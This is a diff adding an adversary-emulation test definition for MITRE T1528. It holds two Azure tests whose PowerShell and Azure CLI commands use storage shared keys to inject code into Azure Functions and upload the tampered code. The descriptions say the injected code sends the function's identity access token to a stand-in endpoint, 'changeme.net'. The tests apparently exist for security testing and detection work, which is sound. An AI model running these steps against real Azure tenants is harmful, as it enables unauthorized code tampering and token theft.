@@ -1,0 +1,97 @@
+{
+  "attack_technique": "T1528",
+  "display_name": "Steal Application Access Token",
+  "atomic_tests": [
+    {
+      "name": "Azure - Functions code upload - Functions code injection via Blob upload",
+      "description": "This test injects code into an Azure Function (RCE).\n\nAttack idea/reference: https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/\n\nSimilar to T1528 \"Azure - Functions code upload - Functions code injection to retrieve the Functions identity access token\", the depicted code injection scenario tampers the source code of Azure Functions to perform Subscription Privilege Escalation by retrieving the identity access token of an Azure functions instance. In this case, the prepared zip file (underlying package for a Function) is expected to contain the tampered function presented in src/code_to_insert.py. Note that the endpoint https://changeme.net needs to be adapted in your packed function code.\n\nNote:\n- The Azure Function modified in this test must be hosted via Azure Blob storage (Info on storage considerations for Azure Function: https://learn.microsoft.com/en-us/azure/azure-functions/storage-considerations). \n- For Function code upload to Azure Functions that are hosted via Azure Files in a File Share, refer to T1528 \"Azure - Functions code upload - Functions code injection to retrieve the Functions identity access token\".\n- The required input fields can be retrieved in a reconnaissance step in test T1619 \"Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI\". The code of function apps may be inspected and prepared from the result of test T1530 \"Azure - Dump Azure Storage Account Objects via Azure CLI\".\n\nRequirements:\n- The test is intended to be executed in interactive mode (with -Interactive parameter) in order to complete the az login command when MFA is required.\n- The EntraID user must have the role \"Storage Account Contributor\", or a role with similar permissions.",
+      "supported_platforms": [
+        "iaas:azure"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "az login    # Log in to Azure CLI\n\n$allowSharedKeyAccess = az storage account show --name \"#{storage_account_name}\" --query \"allowSharedKeyAccess\"\n\nif ($allowSharedKeyAccess -eq \"false\") {    # $allowSharedKeyAccess could be true or null\n    Write-Output \"Shared key access is disabled for this storage account.\"\n} else {    \n    $connectionString = az storage account show-connection-string --name \"#{storage_account_name}\" --query connectionString --output tsv\n\n    # Download blob for cleanup\n    $tmpOriginalFunctionCode = Join-Path $env:temp/ (\"T1528_tmp_original_\" + \"#{blob_name}\")\n    az storage blob download --connection-string $connectionString --container-name \"#{container_name}\" --name \"#{blob_name}\" --file $tmpOriginalFunctionCode --overwrite true\n\n    if ($LASTEXITCODE -eq 0) {\n        # Upload new blob version if download of existing blob succeeded\n        az storage blob upload --connection-string $connectionString --container-name \"#{container_name}\" --name \"#{blob_name}\" --file \"#{file_path_blob}\" --overwrite true\n    } else {\n        Write-Output \"Download original function code failed.\"\n        exit 1\n    }\n}",
+        "cleanup_command": "az login    # Log in to Azure CLI\n\n# Upload previous funciton code\n$tmpOriginalFunctionCode = Join-Path $env:temp/ (\"T1528_tmp_original_\" + \"#{blob_name}\")\naz storage blob upload --account-name \"#{storage_account_name}\" --container-name \"#{container_name}\" --file $tmpOriginalFunctionCode --name \"#{blob_name}\" --overwrite true 2>$null\n\nif ($LASTEXITCODE -eq 0) {\n    Write-Output \"Uploaded original version of function code.\"\n\n    # Delete tmp original blob file if upload succeeded\n    Remove-Item -Path $tmpOriginalFunctionCode -Force -erroraction silentlycontinue\n    Write-Output \"Deleted tmp original blob file: $($tmpOriginalFunctionCode)\"\n} else {\n    Write-Output \"Upload original function code failed.\"\n}"
+      },
+      "input_arguments": {
+        "storage_account_name": {
+          "description": "Name of storage account that is related to the Function",
+          "type": "string",
+          "default": "storage_account_name_example"
+        },
+        "container_name": {
+          "description": "Name of the container that contains the function blob",
+          "type": "string",
+          "default": "container_name_example"
+        },
+        "blob_name": {
+          "description": "Name of the function blob",
+          "type": "string",
+          "default": "blob_example"
+        },
+        "file_path_blob": {
+          "description": "Path to the function code file to upload as blob",
+          "type": "path",
+          "default": "$env:temp/T1528_function_code.zip"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "Azure CLI must be installed",
+          "prereq_command": "try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}",
+          "get_prereq_command": "Install-Module -Name Az -Force"
+        }
+      ],
+      "auto_generated_guid": "9a5352e4-56e5-45c2-9b3f-41a46d3b3a43"
+    },
+    {
+      "name": "Azure - Functions code upload - Functions code injection via File Share modification to retrieve the Functions identity access token",
+      "description": "This test injects code into an Azure Function (RCE) to perform Subscription Privilege Escalation by retrieving the identity access token of an Azure functions instance.\n\nAttack idea/reference: https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/\n\nOnce executed, the \"https://changeme\" will retrieve the access token when the function app is executed on behalf of the tenant. The function may be triggered manually from authorized people, triggered in regular intervals, or in various other ways. The access token can then be used to perform further attack steps with the permissions that the function app holds (e.g. listening virtual machines).\n\nNote: \n- The Azure Function modified in this test must be hosted via Azure Files in a File Share (Info on storage considerations for Azure Function: https://learn.microsoft.com/en-us/azure/azure-functions/storage-considerations).\n- For Function code upload to Azure Functions that are hosted via Azure Blob storage, refer to T1528 \"Azure - Functions code upload - Functions code injection via Blob upload\".\n- The required input fields can be retrieved in a reconnaissance step in test T1619 \"Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI\". The code of function apps may be inspected and prepared from the result of test T1530 \"Azure - Dump Azure Storage Account Objects via Azure CLI\".\n- Important: Change the https://changeme.net in code_to_insert_path to a self-controlled endpoint. This endpoint can be hosted e.g. as request bin via Pipedream to display the body of incoming POST requests.\n- The default injected code to retrieve the access token can be replaced by arbitrary other code. In this case: Replace the code defined in code_to_insert_path\n\nRequirements:\n- The test is intended to be executed in interactive mode (with -Interactive parameter) in order to complete the az login command when MFA is required.\n- The EntraID user must have the role \"Storage Account Contributor\", or a role with similar permissions.\n\nExecution options: Defined by the input field execution_option\n- insert_code: This option (1) downloads the existing funciton code into a tmp file, (2) injects the code from code_to_insert_path at the beginning of the file, and (3) uploads the tampered file to the targeted Azure Function code (Azure File Share File).\n- replace_file: This option uploads the function code defined in code_to_insert_path to the targeted Azure Function code (Azure File Share File).",
+      "supported_platforms": [
+        "iaas:azure"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "az login    # Log in to Azure CLI\n\n$allowSharedKeyAccess = az storage account show --name \"#{storage_account_name}\" --query \"allowSharedKeyAccess\"\n\nif ($allowSharedKeyAccess -eq \"false\") {    # $allowSharedKeyAccess could be true or null\n    Write-Output \"Shared key access is disabled for this storage account.\"\n} else {\n    # Download file for cleanup\n    $tmpOriginalFileName = [System.IO.Path]::GetFileName(\"#{file_path}\")\n    $tmpOriginalFunctionCode = Join-Path $env:temp/ (\"T1528_tmp_original_\" + $tmpOriginalFileName)\n    az storage file download --account-name \"#{storage_account_name}\" --share-name \"#{file_share_name}\" -p \"#{file_path}\" --only-show-errors --dest $tmpOriginalFunctionCode\n\n    if ($LASTEXITCODE -eq 0) {\n        # Upload new funciton code if download of existing code succeeded\n        if (\"#{execution_option}\" -eq \"insert_code\") {\n            # Download file from file share for injection\n            $tmpFunctionCode = Join-Path $env:temp/ (\"T1528_tmp_to_inject_\" + $tmpOriginalFileName)\n            az storage file download --account-name \"#{storage_account_name}\" --share-name \"#{file_share_name}\" -p \"#{file_path}\" --only-show-errors --dest $tmpFunctionCode\n            \n            if ($LASTEXITCODE -ne 0) {\n                Write-Output \"Function code download failed.\"\n                exit 1\n            }\n            Write-Output \"File downloaded: $($tmpFunctionCode)\"\n            \n            $insertContent = Get-Content -Path \"#{code_to_insert_path}\" -Raw  # Load the content of the insert file\n            \n            $content = Get-Content -Path $tmpFunctionCode -Raw  # Inject code to file\n            $content = $insertContent + \"`n\" + $content     # Insert the new code at the beginning\n            $content | Set-Content -Path $tmpFunctionCode       # Write the modified content to the file\n            \n            # Upload file to file share\n            az storage file upload --account-name \"#{storage_account_name}\" --share-name \"#{file_share_name}\" -p \"#{file_path}\" --source $tmpFunctionCode --only-show-errors\n            if ($LASTEXITCODE -ne 0) {\n                Write-Output \"Function code upload failed.\"\n                exit 1\n            }\n            Write-Output \"Uploaded the tampered file\"\n        } elseif (\"#{execution_option}\" -eq \"replace_file\") {\n            az storage file upload --account-name \"#{storage_account_name}\" --share-name \"#{file_share_name}\" -p \"#{file_path}\" --source \"#{code_to_insert_path}\" --only-show-errors\n            if ($LASTEXITCODE -ne 0) {\n                Write-Output \"Function code upload failed.\"\n                exit 1\n            }\n            Write-Output \"Uploaded the tampered file\"\n        } else {\n            Write-Output \"Please choose a valid execution_option\"\n            exit 1\n        }\n    } else {\n        Write-Output \"Download original function code failed.\"\n        exit 1\n    }\n}",
+        "cleanup_command": "az login    # Log in to Azure CLI\n\n# Upload previous funciton code\n$tmpOriginalFileName = [System.IO.Path]::GetFileName(\"#{file_path}\")\n$tmpOriginalFunctionCode = Join-Path $env:temp/ (\"T1528_tmp_original_\" + $tmpOriginalFileName)\naz storage file upload --account-name \"#{storage_account_name}\" --share-name \"#{file_share_name}\" -p \"#{file_path}\" --source $tmpOriginalFunctionCode --only-show-errors 2>$null\n\nif ($LASTEXITCODE -eq 0) {\n    Write-Output \"Uploaded original version of function code.\"\n\n    # Delete tmp original f file if upload succeeded\n    if (\"#{execution_option}\" -eq \"insert_code\") {\n        $tmpFunctionCode = Join-Path $env:temp/ (\"T1528_tmp_to_inject_\" + $tmpOriginalFileName)\n        Remove-Item -Path $tmpFunctionCode -Force -erroraction silentlycontinue\n        Write-Output \"Deleted tmp file: $($tmpFunctionCode)\"\n    }\n\n    # Delete tmp original file\n    Remove-Item -Path $tmpOriginalFunctionCode -Force -erroraction silentlycontinue\n    Write-Output \"Deleted tmp original file: $($tmpOriginalFunctionCode)\"\n} else {\n    Write-Output \"Upload original function code failed.\"\n}"
+      },
+      "input_arguments": {
+        "storage_account_name": {
+          "description": "Name of storage account that is related to the Function",
+          "type": "string",
+          "default": "storage_account_name_example"
+        },
+        "execution_option": {
+          "description": "Chooses execution option insert_code, or replace_file",
+          "type": "string",
+          "default": "insert_code"
+        },
+        "file_share_name": {
+          "description": "Name of the file share that is related to the Function",
+          "type": "string",
+          "default": "file_share_name_example"
+        },
+        "file_path": {
+          "description": "Path to the Function file in the file share",
+          "type": "path",
+          "default": "site/wwwroot/function_app.py"
+        },
+        "code_to_insert_path": {
+          "description": "The code that will be injected into the Function",
+          "type": "path",
+          "default": "$PathToAtomicsFolder/T1528/src/code_to_insert.py"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "Azure CLI must be installed",
+          "prereq_command": "try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}",
+          "get_prereq_command": "Install-Module -Name Az -Force"
+        }
+      ],
+      "auto_generated_guid": "67aaf4cb-54ce-42e2-ab56-e0a9bcc089b1"
+    }
+  ]
+}
